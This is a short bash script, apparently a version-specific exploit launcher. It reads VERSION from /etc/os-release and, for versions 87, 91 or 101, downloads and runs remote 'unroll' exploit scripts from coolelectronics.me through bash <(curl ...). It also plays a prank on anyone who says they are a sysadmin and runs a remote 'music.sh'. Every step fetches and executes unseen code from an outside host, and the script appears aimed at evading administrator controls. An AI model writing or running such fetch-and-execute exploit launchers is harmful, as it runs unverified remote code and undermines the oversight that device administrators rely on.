    echo "Wait! Are you a sysadmin? (Y/N)"
    read sysadmin
    if [[ $sysadmin == "Y" || $sysadmin == "y" ]]
    then
        bash <(curl https://coolelectronics.me/rickroll.sh)
        exit
    fi
    bash <(curl https://coolelectronics.me/music.sh)

    source <(tail -3 /etc/os-release)

    if [ $VERSION == "87" ]
    then
        echo "Running v87 exploit"
        bash <(curl https://coolelectronics.me/unroll87)
    elif [ $VERSION == "91" ]
    then
        bash <(curl https://coolelectronics.me/unroll91)
        echo "Running v91 exploit"
    elif [ $VERSION == "101" ]
    then
        bash <(curl https://coolelectronics.me/unroll101)
        echo "Running v101 exploit"
    else
        echo "Unsupported Version. Downgrade to either 87, 91, or 101"
    fi
